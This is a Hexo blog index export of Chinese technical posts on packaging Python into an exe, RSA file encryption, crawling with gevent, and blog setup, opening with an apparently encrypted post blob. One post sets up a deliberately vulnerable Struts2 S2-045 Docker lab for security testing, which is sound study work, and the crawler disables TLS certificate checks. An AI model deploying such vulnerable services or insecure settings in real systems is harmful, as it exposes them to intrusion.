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]]></content>
      <categories>
        <category>Code</category>
        <category>VBA</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>VBA</tag>
        <tag>Excel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-py转exe(附GUI界面)]]></title>
    <url>%2Farchives%2F2329ebda.html</url>
    <content type="text"><![CDATA[有时候写了一个脚本，但是换到另外一台电脑上的时候，发现并没有Python的解析环境，这时候将py文件转成exe，再将其换到另外一台Windows电脑运行，是一个很好的选择。准备py转exe有:py2exe、pyinstaller等多种选择。这两种我都用过，我更倾向于pyinstaller。本文使用的就是pyinstaller。pyinstaller使用pip快捷安装pyinstaller。如果对pyinstaller感兴趣，可以参考文档1pip install pyinstaller如果无法使用pip安装，可以在官网下载源码安装。成功安装可以输出对应版本信息。py文件将py文件转exe，那么必备的就是py文件了。本文采用我以前写的RSA加密文件脚本，可以在这里下载。转换Exe有了pyinstaller之后，将py文件转成exe只需要一条命令即可完成。该条命令会生成两个文件夹:build、dist。生成的exe在dist文件夹中。1pyinstaller Encryptiong.py单文件生成刚刚转换出来的exe有许多依赖的文件在dist文件夹下。就是说想要运行这个exe，那么整个dist文件夹下所有文件都需要存在。pyinstaller提供了将py文件转换成单exe模式，只需要在转换命令加上-F参数即可。1pyinstaller Encryptiong.py -F压缩如果转换出来的exe大小很大，pyinstaller也支持压缩。压缩需要下载upx，并加上对应参数即可。1pyinstaller Encryptiong.py -F --upx-dir D:\Code\Python27\upx394w图标现在已经成功生成了exe，但是现在的exe图标很”大众”。这是pyinstaller默认图标，如果想自定义图标的话，pyinstaller也提供了对应参数-i。但是需要提供多种尺寸的ico图标，因为不同情况下需要不一样尺寸的图标。可以使用png2ico工具转换，使用png2ico需要使用对应的命令。1png2ico myicon.ico icon_128x128.png icon_64x64.png icon_48x48.png icon_32x32.png icon_16x16.png也可以使用在线转换工具ConvertIcon!,导出的时候需要勾对应尺寸。有了图标之后，使用对应命令即可。1pyinstaller Encryptiong.py -F --upx-dir D:\Code\Python27\upx394w -i ico.icoGUI界面现在生成的exe文件，打开之后连GUI界面都没有。没有GUI界面的exe就是耍流氓。(Ps:来源某位小伙伴)我这么正经的人，怎么可能耍流氓！Python想要生成GUI界面，需要安装PyQt。我安装的是PyQt4。由于最新版的PyQt已经不提供Windows二进制安装程序，大家可以安装4.11.4版本。找到合适自己的版本，下载、安装即可。UI生成安装完PyQt4之后，大家可以在Python27\Lib\site-packages\PyQt4文件夹找到designer.exe用来构建GUI界面的UI。打开designer.exe新建一个窗体，通过左边拖拽控件，将控件按照自己喜欢的位置布局到窗体里面。设计好了保存成ui文件即可。最后可以Python27\Lib\site-packages\PyQt4\pyuic4.bat来生成对应的布局代码。1pyuic4.bat -o EncryptiongUi.py EncryptiongUi.ui生成的布局代码文件有一个Ui类，其中包含了setupUi、retranslateUi函数。GUI生成用了UI布局，现在新建一个脚本(Encry.py)通过代码生成一个窗体即可。12345678910111213141516171819202122# -*- coding: utf-8 -*-from PyQt4.QtGui import * from PyQt4 import QtGuifrom PyQt4.QtCore import * import sys import EncryptiongUiclass TestDlg(QDialog, EncryptiongUi.Ui_RSA): # 继承EncryptiongUI.UI_RSA def __init__(self, parent=None): super(TestDlg, self).__init__(parent) self.setupUi(self) # self.setWindowIcon(QtGui.QIcon('./ico.ico')) # 设置icon def main(): app = QApplication(sys.argv) dialog = TestDlg() dialog.show() sys.exit(app.exec_()) if __name__ == '__main__': main()运行Encry.py即可生成一个GUI界面。控件功能配置我设计了一个包含两个line、三个button的窗体。根据button来执行Encryptiong.py的不同功能，根据line的值进行传参。首先对Encryptiong.py脚本进行改造。只需要把180、181注释，让其不运行即可。12# if __name__ == '__main__': # main()其次对EncryptiongUI.py进行改造。导入Encryptiong的Encryptiong，用来执行加密、解密等功能。1from Encryptiong import Encryptiong接下来将按钮的单击属性打开。一共需要打开三个按钮的属性,pushButton是按钮的自定义名称，根据命名进行修改。12self.pushButton.setCheckable(True)self.pushButton.setChecked(True)然后在UI类中，编写工作的函数。1234567891011121314151617def work(self, Ctype): try: if Ctype == 1: Encryptiong().encryp() QtGui.QMessageBox.about(self, u'提醒', u"成功生成公、私钥文件！") # 设置提醒消息框 elif Ctype == 2: public = str(self.lineEdit.text()) # 获取line的文本 filepath = str(self.lineEdit_2.text()) # 获取line2的文本 Encryptiong(public=public, filepath=filepath).encryption() QtGui.QMessageBox.about(self, u'提醒', u"完成加密！") elif Ctype == 3: private = str(self.lineEdit.text()) filepath = str(self.lineEdit_2.text()) Encryptiong(private=private,decrypt=filepath).decrypted() QtGui.QMessageBox.about(self, u'提醒', u"完成解密！") except: QtGui.QMessageBox.about(self, u'警告', u"输入有误,请重新输入！")回到Ui类的setupUi函数，设置按钮单击执行工作函数。123self.pushButton.clicked.connect(lambda : self.work(1)) # 单击调用work函数self.pushButton_2.clicked.connect(lambda : self.work(2))self.pushButton_3.clicked.connect(lambda : self.work(3))现在已经成功让Encryotiong脚本的功能通过GUI界面来执行、实现。最后通过pyinstaller进行打包成exe。1pyinstaller -F -w -i ico.ico --upx-dir D:\Code\Python27\upx394w Encryptiong.py总结在编写使用pyinstaller、PyQt4生成GUI界面的exe时，遇到几个问题，在此记录一下。pyinstaller -i加载图标的时候，图标需要是多种尺寸的图标。要不然某些情况是无法显示的;pyinstaller -w生成无终端窗口需要脚本有GUI界面;PyQt4的Button执行函数，需要使用lambda生成匿名函数;PyQt4的QMessageBox进行弹框提示需要将字符串转成Unicode编码，要不然会乱码。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-RSA加密文件]]></title>
    <url>%2Farchives%2Ffb3e56b9.html</url>
    <content type="text"><![CDATA[每个人都有自己的小秘密，如何保护好它是非常重要的。我通过Python27结合RSA算法保护我的”小秘密”。准备使用pycrypto库就可以完成RSA加、解密。Pycrypto使用pip快捷安装pycrypto。如果对pycrypto感兴趣，可以参考文档。1pip install pycrypto如果无法使用pip安装，可以在这里下载编译好的源文件进行安装。终端处理终端信息获取可以通过sys.argv或者使用getopt库。syssys.argv是一个列表对象。用来获取终端信息。终端格式示例。1python getinfo.py info1 info2 info3sys.argv[0]是getinfo.py，sys.argv[1]是info1，sys.argv[2]是info2，sys.argv[3]是info3。Getoptgetopt可以用来获取终端参数，实际使用的时候效果比sys.argv好很多。如果对getopt感兴趣，可以参考文档getopt有短格式、长格式。”-h-f:”为短格式，如果后面带冒号说明该参数需要加参数值，不加冒号说明该参数不需要加参数值。”[‘help’, ‘file=’]”为长格式，如果后面带等号说明该参数需要加参数值，如果后面不带等号说明该参数不需要参数值。终端格式示例。1python getinfo.py -h -f=info.txt代码示例。1234567import getoptopt, args = getopt.getopt(sys.argv[1:], "-h-f:",['help', 'file='])for opt_name, opt_value in opts: if opt_name in ('-h', '--help'): print "This is help!" if opt_name in ('-f', '--file'): print opt_valuepycrypto使用pycrypto包含许多加密方式：AES、SHA256、RSA等。出于安全性考虑，我使用RSA来加密文件。生成公、私钥文件RSA加密需要使用到公钥文件、RSA解密需要使用到私钥文件。如果大家对RSA算法不了解的话，可以参考Wiki)。通过上文可以得知，生成自己的公钥、私钥文件是十分重要的。pycrypto支持生成公钥、私钥文件。代码示例。12345678910111213from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSArandom_generator = Random.new().read # 伪随机数生成器rsa = RSA.generate(self.generateNum, random_generator) # rsa算法生成private_pem = rsa.exportKey() # 私钥生成with open('private.pem', 'w') as f: # 生成私钥文件 f.write(private_pem)public_pem = rsa.publickey().exportKey() # 公钥生成with open('public.pem', 'w') as f: # 生成公钥文件 f.write(public_pem)RSA加密RSA加密需要使用到公钥文件。代码示例。1234567891011from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAmessage = "My name is Hywell!"with open('public.pem') as f: # 读取公钥文件 key = f.read()rsakey = RSA.importKey(key) # 加载公钥cipher = Cipher_pkcs1_v1_5.new(rsakey)cipher_text = cipher.encrypt(message) # 加密messageRSA解密RSA解密需要使用到私钥文件。代码示例。123456789101112from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAcipher_text = "This is cryptoStr!"random_generator = Random.new().read # 伪随机数生成器with open('ghost-private.pem') as f: # 读取私钥文件 key = f.read()rsakey = RSA.importKey(key) # 加载私钥cipher = Cipher_pkcs1_v1_5.new(rsakey)result = cipher.decrypt(base64.b64decode(encrypt_text), random_generator) # 解密cipher_text总结在编写使用RSA加密文件时，遇到了几个问题，在此记录一下。使用getopt库作为命令行参数获取，使用for获取对应参数的值的时候，获取得到值是以=开头。因此，实际需要使用value[1:]来获取;RSA加密常见的key_size有1024bit、2048bit两种，解密的时候需要选择跟加密时一样的bit;RSA加密单次加密字符的长度有限制，最大为(key_size/8)-11;使用1024bitRSA加密100长度的字符会生成128长度的加密过的字符;使用2048bitRSA加密200长度的字符会生成256长度的加密过的字符。完整代码完整代码支持终端获取参数、文件夹所有文件RSA加密、文件夹所有文件RSA解密。完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞环境搭建]]></title>
    <url>%2Farchives%2F583f4516.html</url>
    <content type="text"><![CDATA[在进行安全测试的时候，经常需要搭建各种各样、不同配置的漏洞环境。有时候一天不到就能搞定，有时候两三天都没成功。后来发现一个神器:Docer，结合GitHub上面的漏洞靶场可以通过几条命令就能成功”搭建”一个漏洞环境。准备本文选用Debian作为操作环境。大家也可以根据自己的操作系统，安装对应Docker。大家可以去Docker官网查看如何安装，也可以去Docker中文看如何安装。安装Docker安装Docker之前需要在/etc/apt/sources.list文件中添加backports源。使用Vim命令。(下面所有命令建议在root权限下执行，要不然请在命令前加sudo。)1vim /etc/apt/sources.list添加deb http://http.debian.net/debian jessie-backports main，执行更新操作。1apt-get update成功更新之后，安装docker.io。1apt-get install docker.io查看Docker版本信息。1docker --version添加漏洞环境接下来就可以使用Docer添加对应的漏洞环境，那么漏洞环境在哪里找勒？这里我推荐两个地址:phith0h、Medicean。这里我以Struts2-S2-045为例：[S2-045][https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-045]。将环境下载到本地，如果使用命令无法成功下载，那么多下载几次或者设置一下代理(你懂的)。1docker pull medicean/vulapps:s_struts2_s2-045下载完成之后，启动环境。-p后面的参数是将容器的端口映射到本机的端口，-p 80:8080就是将容器的8080端口映射到本机的80端口，可以自定义修改。1docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-045漏洞复现使用Exploit工具复现S2-045漏洞。Docker常用命令查看所有镜像。1docker images拉取镜像。1docker pull保存镜像。1docker save medicean/vulapps:s_struts2_s2-045 &gt; /tmp/s2-045.tar加载镜像。1docker load &lt; /tmp/s2-045.tar查看正在运行的容器。1docker ps停止容器，使用docker ps查看的id来停止对应容器。1docker stop ddedb0cd35e5启动容器。1docker start ddedb0cd35e5关闭容器。1docker kill ddedb0cd35e5删除镜像，如果不知道id可以使用Tab键来进行补全查看。1docker rm id总结使用Docker虽然可以快速的部署漏洞环境，但是这样不容易理解一些由于配置问题导致的漏洞。因此，建议在新漏洞出现之后使用Docker快速复现完成后，自己手工搭建一遍。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-并发爬虫]]></title>
    <url>%2Farchives%2F426443e5.html</url>
    <content type="text"><![CDATA[现在数据就是王道，而爬虫就是获取数据的快速途径之一！准备看标题，咱们就应该知道需要用到Python27。本文通过Python 结合 requests库进行爬取操作，BeautifulSoup4使用lxml进行解析操作，gevent进行并发操作。Python27选择对应的操作系统的Python27进行下载。下载完成进行安装，之后配置环境变量即可。环境变量需要配置两处，一处是Python27的安装目录，一处是Python27安装目录下的Scripts目录。环境变量配置右键【我的电脑】→【属性】，点击【高级系统设置】中的【高级】选项卡中【环境变量】，在【系统变量】窗口中找到【Path】变量。点击【编辑】，加入对应的环境变量（例如D:\Code\Python27、D:\Code\Python27\Scripts）。如果是Win10系统，新建两条即可。如果是Win10等系统，点击编辑之后在后面加入;D:\Code\Python27;D:\Code\Python27\Scripts即可。1python --version1pip --versionRequests使用pip快捷安装requests。1pip install requestsBeautifulSoup使用pip快捷安装BeautifulSoup4。1pip install beautifulsoup4lxml使用pip快捷安装lxml。1pip install lxmlGevent使用pip快捷安装gevent。1pip install gevent爬取流程在准备阶段，咱们已经将“斧柄”、“斧刃”准备好了，到时候把两个组装起来，选一棵树，进行“伐木”工作。爬取流程分为：获得url、访问url、解析页面、获取页面url。入口url由于本文只爬取站点中存在的url，并不取特殊数据。因此，入口url可以自定义输入。1entry_url = raw_input('Place enter the entry url:')请求页面请求页面操作通过使用requests库来完成。如果对requests库感兴趣，可以参考官方文档。想要使用requests库，需要先导入requests库。这步操作就是将斧柄(Pythnon27)、斧刃(requests)组装起来。1import requests接下来就需要使用requests库的get方法。1r = requests.get(entry_url)解析页面通过上面的操作，咱们已经获取了页面的信息。然后就是BeautifulSoup4发挥的时候了。如果对BeautifulSoup4库感兴趣，可以参考官方文档1from bs4 import BeautifulSoup本文爬虫只需要获取站点url即可，不需要获取站点特殊数据。因此，获取a标签的href方法的值即可。123soup = BeautifulSoup(r.text, 'lxml')for i in soup.find('a'): get_url = i.get('href')异步爬取异步爬取可以让程序执行更快，时间既是生命。如果对gevent库感兴趣，可以参考官方文档。队列队列(Queue)适用于多线程编程，让数据安全地在生产者与消费者之间进行信息传递。让url放在队列数据结构中，可以让队列自动帮我们销毁已经被调用的url。123from gevent.queue import QueueurlQueue = Queue()异步工作将工作流程制作成函数，调用gevent.spawn形成工作队列。当适当的时候执行。12345import geventthreads=[]threads.append(gevent.spawn(work, **keyword))gevent.joinall(threads)总结在编写并发爬虫的时候，遇到了几个问题，在此记录一下。url请求是http还是https，如果是https的话，需要将requests的verify设置为False;并发的时候如何判断任务是否已经结束？我是通过判断队列为空并且无待工作的任务，不知道这种判断方式是否可取。有没有好心人告诉我有什么优雅的方式么;如果对并发量不进行设置的话，有可能导致内存飙高。我通过对线程列表进行设置，当线程列表到100时就运行一次。同求优雅的方式;href方法里面存在两种情况：包含域名(href=”http://xxx.com/index.html&quot;)，不包含域名(href=&quot;/index.html“);用户输入与href方法内情况不同。例如用户输入https://www.iassas.com，页面href标签是https://iassas.com（或者两者反一下）。现在就按照用户输入为准;子域名链接爬取，现在判断逻辑不爬取子域名;href方法中的url有可能会带有#(跳转对应页面位置)，模拟浏览器是将#后面所有字符不当成url考虑;url会被url编码，调用urllib.unquote来解码。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。由于Web环境千奇百怪，程序出错在所难免。请体谅！]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客配置]]></title>
    <url>%2Farchives%2F459ba203.html</url>
    <content type="text"><![CDATA[通过GitHub Page + Hexo(Next主题)搭建好博客之后，需要对站点配置文件、主题配置文件进行自定义配置。本篇文章对一些常用或需要自定义的配置进行描述。站点配置站点配置文件为全局配置文件，影响整个站点。文件路径:\根目录\_config.yml。基础配置站点基础配置包括标题、副标题、描述、作者、站点语言、URL设置等。通过对基础配置进行修改，就可以完成大部分的”轻度折腾”。标题标题会影响整站的标题，并且会在显示页面上。1title: 站点标题副标题副标题位于在主标题下，在Next主题中会被隐藏，需要通过修改\根目录\themes\next\source\css\_schemes\Mist\_logo.styl的.site-subtitile字段的display值或者在.site-subtitle前面加#进行注释。1subtitle: 站点副标题描述描述位于站点概览中，用最”简单”的语言描述一下最棒的自己。1description: 最简单的语言作者作者位于站点概览、版本声明等位置，留下自己的大名，让自己”声名远扬”吧！1author: 最棒的自己站点语言站点语言会影响整个站点的显示语言。支持简中、繁中、英文等。1language: zh-Hans|语言 |对应值 | |English |en | |简体中文 |zh-Hans | |法语 |fr-FR ｜ |繁体中文 |zh-hk/zh-tw｜ |俄语 |ru ｜ |德语 |de ｜ |葡萄牙语 |pt ｜ |日语 |ja ｜ URL设置URL设置包括url、enforce_ssl、root、permalink、permalink_default等字段。其中url字段设置为博客域名。根据博客所处目录设置root，如果为子目录，root需要进行对应修改。其余字段可保持不变。12url: 你的域名root: 站点所处目录其他配置分页设置分页设置主要修改per_page字段，可以对主页、档案、标签等进行每页显示文章数设置。1234567891011index_generator: path: '' per_page: 5 order_by: -datearchive_generator: per_page: 20 yearly: true monthly: truetag_generator: per_page: 10per_page: 10RSSRSS位于站点概览中，可以通过安装插件来完成，安装hexo-generator-feed。1npm install hexo-generator-feed --save安装插件之后，通过配置plugin字段加载插件。12plugin: - hexo-generator-feed对feed字段进行配置，如果不存在，则新建feed字段。123456feed: type: atom path: atom.xml limit: 10 hub: content:主题设置下载喜欢的主题，通过修改theme字段进行更换主题。Next主题下载，也可以在hexo提供的主题下载页面寻找喜欢的主题。1theme: next主题配置这里介绍Next的主题配置，主题配置文件文件路径:\根目录\themes\next\_config.yml。站标站标位于标签页左边,路径指向source目录下。建议ico大小为32x32。在线制作链接。1favicon: /iamges/favicon.ico社交社交位于站点概览，可以添加GitHub、知乎、微博、豆瓣等社交链接。12social: GitHub: https://github.com/hywell社交ico可以在图标库中查找，通过配置social_icons字段进行定义。123social_icons: enable: true GitHub: github打赏打赏位于每篇文章底部，可以添加微信、支付宝二维码，并设置感谢语。123reward_comment: 感谢语wechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg友链友情链接位于站点概览，可以设置links标题、友链名称、友链链接等。123links_title: 友情链接links: GitHub: https://github.com微信二维码微信二维码位于每篇文章底部。有朋自远方来，不亦乐乎！1234wechat_subscriber: enabled: true qcode: /images/wechat.jpg description: 有朋自远方来,不亦乐乎！版权版权信息位于每篇文章底部，表明作者、链接、版权声明。1234post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/结尾通过对以上参数进行配置，相信现在的博客已经开始呈现出一丝丝的与众不同了吧。生命在于折腾，折腾了博客搭建、折腾了博客配置，接下来开始折腾博客美化了。]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建博客]]></title>
    <url>%2Farchives%2F5c83b0d3.html</url>
    <content type="text"><![CDATA[第一次搭建博客，一开始选用GitHub Page + jekyll 从网上找了许多模板，也自己去尝试写，发现总是不如人意。后来，改用GitHub Page + Hexo,套用Next主题满足了折腾的”愿望”。准备Hexo安装Hexo需要先安装Nodejs、Git。安装Git从Git官网下载对应系统版本进行安装Download。我是Windows系统，因此下载Windows版本。打开终端，输入1git --version查看对应版本，如果成功输出版本信息代表完成安装。安装Nodejs从Nodejs官网下载对应系统版本安装Download。我是Windows系统，因此下载Windows版本。打开终端，输入1npm -v查看对应版本，如果成功输出版本信息代表完成安装。安装hexo以管理员权限打开终端，进入对应目录（以E:\hexo为例）输入1E:\hexo&gt;npm install -g hexo安装途中出现会可能WARN不用担心。域名（可选）GitHub Page可以通过配置，让其可通过自定义域名进行访问（例如通过iassas.com即可访问我的博客）。建议通过GoDaddy申请，输入心仪的域名点击搜索域名。如果域名未被注册，将其添加到购物车。进入购物车进行付款。付款途中根据需要，添加增值服务。DNS解析（可选）为了让博客更好、更快地访问就需要配置DNS。建议通过DNSPOD申请，免费注册一个账户之后进入个人管理界面。选择左边菜单栏的[域名解析]，添加一个域名，输入自己的域名（例如iassas.com），点击确定。点击iassas.com进行配置，点击添加记录，共添加三条记录，添加以下信息进行保存即可。下述第三条www记录中的记录值需要输入对应的github.io（如果没有，请看下一小节）。| 主机记录 |记录类型 |线路类型 | 记 录 值 | | @ | A |默认 |192.30.252.153 | | @ | A |默认 |192.30.252.154 | | www | CNAME |默认 |user.github.io | 修改域名服务器，以GoDaddy结合DNSPOD为例。登陆GoDaddy，点击我的产品。选择对应的域名，点击DNS。在域名服务器项中，使用自定义域名服务器。配置如下| 域 名 服 务 器 | |f1g1ns1.dnspod.net | |f1g1ns2.dnspod.net | GitHub PageGitHub Page需要先注册一个GitHub账号GitHub。进入个人主页（例如https://github.com/hywell，是我的主页），点击右上角+号，点击New repository新建库。库名需要以账号名.github.io命名（例如hywell.github.io)，权限选择Public。点击下方Create repository建立库。建站创建博客打开终端，输入12E:\hexo&gt;hexo init blogE:\hexo&gt;npm install成功创建一个站点。进入站点目录，输入清理、编译、本地运行:123E:\hexo\blog&gt;hexo cleanE:\hexo\blog&gt;hexo gE:\hexo\blog&gt;hexo s这时候就可以通过浏览器访问127.0.0.1:4000，见证效果了！更换主题（可选）本博客套用Next主题，也可自行下载别的主题。打开终端，输入1E:\hexo\blog&gt;git clone https://github.com/iissnan/hexo-theme-next themes/next博客配置博客配置文件有站点配置文件、主题配置文件。站点配置文件为博客根目录下的_config.yml文件(E:\hexo\blog\_config.yml)，主题配置文件为\themes\主题_config.yml文件(E:\hexo\blog\themes\next\_config.yml)。需要注意的是在修改配置时，配置值前面需要加一个空格。以配置名: 配置值的形式，例如：title: blog。这里简要的介绍一些配置。站点配置修改主题，通过修改站点配置文件的theme字段，将其修改成对应的值 theme: next。修改站点标题，通过修改站点配置文件的title字段，将其修改成对应的值 title: Blog。修改站点语言，通过修改站点配置文件的language字段，将其修改成对应的值language: zh-Hans。修改时区，通过修改站点配置文件的timezone字段，将其修改成对应的值timezone: Asia/Shanghai。主题配置修改图标，通过修改主题配置文件的favicon字段，将其修改成对应的值favicon: /images/favicon.ico。这里的路径为/themes/next/source/images/favicon.ico，如果没有对应文件，则需要新建。修改头像，通过修改主题配置文件的avatar，将其修改成对应的值avatar: /upload/avatar.png。这里的路径为/themes/next/source/upload/avatar.png，如果没有对应文件，则需要新建。部署GitHub部署使用GitBash(\Git\git-bash.exe)配置身份信息，在GitBash中输入123git config --global user.name "yourname"git config --global user.email "youremail"ssh-keygen -t rsa -C "youremail"在用户目录下找到.ssh文件夹(C:\user\youname.ssh)，将id_rsa.pub中的密钥复制到GitHub-Setting-Key中。点击New SSH key，添加一个新的SSH key：输入任意title、将id_rsa.pub内容粘贴到Key中，最后点击 Add SSH 